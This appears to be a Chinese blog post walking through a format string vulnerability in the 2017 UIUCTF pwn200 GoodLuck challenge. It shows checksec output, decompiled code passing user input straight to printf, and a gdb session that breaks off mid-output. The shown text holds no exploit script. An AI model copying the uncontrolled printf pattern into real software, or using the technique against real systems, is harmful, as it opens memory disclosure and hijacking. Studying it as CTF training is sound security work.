<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>格式化字符串漏洞举例 - SmallT40&#39;s Blog</title><meta name="author" content="">
<meta name="description" content="[TOC]
格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。
"><meta name="keywords" content=''>
  <meta itemprop="name" content="格式化字符串漏洞举例">
  <meta itemprop="description" content="[TOC]
格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。">
  <meta itemprop="datePublished" content="2021-02-06T18:50:57+00:00">
  <meta itemprop="dateModified" content="2021-02-06T18:50:57+00:00">
  <meta itemprop="wordCount" content="8215">
  <meta itemprop="keywords" content="Technology"><meta property="og:url" content="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/">
  <meta property="og:site_name" content="SmallT40&#39;s Blog">
  <meta property="og:title" content="格式化字符串漏洞举例">
  <meta property="og:description" content="[TOC]
格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-02-06T18:50:57+00:00">
    <meta property="article:modified_time" content="2021-02-06T18:50:57+00:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="格式化字符串漏洞举例">
  <meta name="twitter:description" content="[TOC]
格式化字符串漏洞例子 64位程序格式化字符串漏洞 原理 前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" title="格式化字符串漏洞举例 - SmallT40&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" title="Linux保护技术" /><link rel="next" type="text/html" href="http://localhost:1313/posts/ret2csu/" title="Ret2csu" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "格式化字符串漏洞举例",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/"
    },"genre": "posts","keywords": "","wordcount":  8215 ,
    "url": "http:\/\/localhost:1313\/posts\/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B\/","datePublished": "2021-02-06T18:50:57+00:00","dateModified": "2021-02-06T18:50:57+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Author"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
              <a class="menu-link" href="/about/">关于</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/about/">关于</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>格式化字符串漏洞举例</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/technology/" class="post-category" title="Category - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="published on 2021-02-06 18:50:57"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-02-06">2021-02-06</time></span>&nbsp;<span title="8215 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 8300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>17 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#格式化字符串漏洞例子">格式化字符串漏洞例子</a>
          <ul>
            <li><a href="#64位程序格式化字符串漏洞">64位程序格式化字符串漏洞</a>
              <ul>
                <li><a href="#原理">原理</a></li>
                <li><a href="#例子">例子</a></li>
              </ul>
            </li>
            <li><a href="#hijack-got">hijack GOT</a>
              <ul>
                <li><a href="#原理-1">原理</a></li>
                <li><a href="#例子-1">例子</a></li>
              </ul>
            </li>
            <li><a href="#hijack-retaddr">hijack retaddr</a>
              <ul>
                <li><a href="#原理-2">原理</a></li>
                <li><a href="#例子-2">例子</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>[TOC]</p>
<h2 id="格式化字符串漏洞例子" class="heading-element"><span>格式化字符串漏洞例子</span>
  <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e%e4%be%8b%e5%ad%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="64位程序格式化字符串漏洞" class="heading-element"><span>64位程序格式化字符串漏洞</span>
  <a href="#64%e4%bd%8d%e7%a8%8b%e5%ba%8f%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="原理" class="heading-element"><span>原理</span>
  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>前六个整形或指针参数依次保存在RDI，RSI，RDX，RCX，R8，和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</p>
<h4 id="例子" class="heading-element"><span>例子</span>
  <a href="#%e4%be%8b%e5%ad%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>这里用的是2017年的UIUCTF中的<strong>pwn200GoodLuck</strong>为例来介绍。</p>
<p>因为只有本地，所以在本地放了flag.txt文件</p>
<p>题目链接：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</p>
<p>首先checksec下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">goodluck</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="nf">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span></span></span></code></pre></div><p>开了NX和部分RELRO。</p>
<p>漏洞很显然，就在printf那里。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+3h] [rbp-3Dh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-3Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-3Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-38h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-30h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v10</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v10</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">_IO_getc</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;what&#39;s the flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">format</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ms&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">format</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="n">format</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v4</span> <span class="o">||</span> <span class="n">v10</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You answered:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">But that was totally wrong lol get rekt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;That&#39;s right, the flag is %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">b</span> <span class="n">printf</span> 
</span></span><span class="line"><span class="cl"><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x400640</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span> 
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">bash</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="nl">goodluck</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">bash</span><span class="p">:</span> <span class="n">line</span> <span class="mi">0</span><span class="o">:</span> <span class="nl">exec</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="nl">goodluck</span><span class="p">:</span> <span class="n">cannot</span> <span class="nl">execute</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
</span></span><span class="line"><span class="cl"><span class="n">During</span> <span class="n">startup</span> <span class="n">program</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="mf">126.</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span> 
</span></span><span class="line"><span class="cl"><span class="n">what</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">the</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl"><span class="mi">12345678</span>
</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="nl">answered</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">RAX</span><span class="p">:</span> <span class="mh">0x0</span> 
</span></span><span class="line"><span class="cl"><span class="nl">RBX</span><span class="p">:</span> <span class="mh">0x0</span> 
</span></span><span class="line"><span class="cl"><span class="nl">RCX</span><span class="p">:</span> <span class="mh">0x7ffff7af2224</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__GI___libc_write</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">RDX</span><span class="p">:</span> <span class="mh">0x7ffff7dcf8c0</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
</span></span><span class="line"><span class="cl"><span class="nl">RSI</span><span class="p">:</span> <span class="mh">0x602490</span> <span class="p">(</span><span class="s">&#34;You answered:</span><span class="se">\n</span><span class="s">g</span><span class="se">\n</span><span class="s">111111}</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">RDI</span><span class="p">:</span> <span class="mh">0x602cb0</span> <span class="p">(</span><span class="s">&#34;12345678&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">RBP</span><span class="p">:</span> <span class="mh">0x7fffffffdf40</span> <span class="o">--&gt;</span> <span class="mh">0x400900</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">r15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">RSP</span><span class="p">:</span> <span class="mh">0x7fffffffdef8</span> <span class="o">--&gt;</span> <span class="mh">0x400890</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">234</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x4009b8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">RIP</span><span class="p">:</span> <span class="mh">0x7ffff7a46f70</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__printf</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">R8</span> <span class="p">:</span> <span class="mh">0x7ffff7fdc500</span> <span class="p">(</span><span class="mh">0x00007ffff7fdc500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">R9</span> <span class="p">:</span> <span class="mh">0x7ffff7b50a60</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__memcpy_ssse3</span><span class="o">+</span><span class="mi">9168</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsi</span><span class="o">-</span><span class="mh">0xd</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nl">R10</span><span class="p">:</span> <span class="mh">0x3</span> 
</span></span><span class="line"><span class="cl"><span class="nl">R11</span><span class="p">:</span> <span class="mh">0x7ffff7a46f70</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__printf</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">R12</span><span class="p">:</span> <span class="mh">0x4006b0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">ebp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">R13</span><span class="p">:</span> <span class="mh">0x7fffffffe020</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
</span></span><span class="line"><span class="cl"><span class="nl">R14</span><span class="p">:</span> <span class="mh">0x0</span> 
</span></span><span class="line"><span class="cl"><span class="nl">R15</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nl">EFLAGS</span><span class="p">:</span> <span class="mh">0x202</span> <span class="p">(</span><span class="n">carry</span> <span class="n">parity</span> <span class="n">adjust</span> <span class="n">zero</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f5c</span> <span class="o">&lt;</span><span class="n">__fprintf</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x7ffff7b16b10</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="o">&gt;</span>
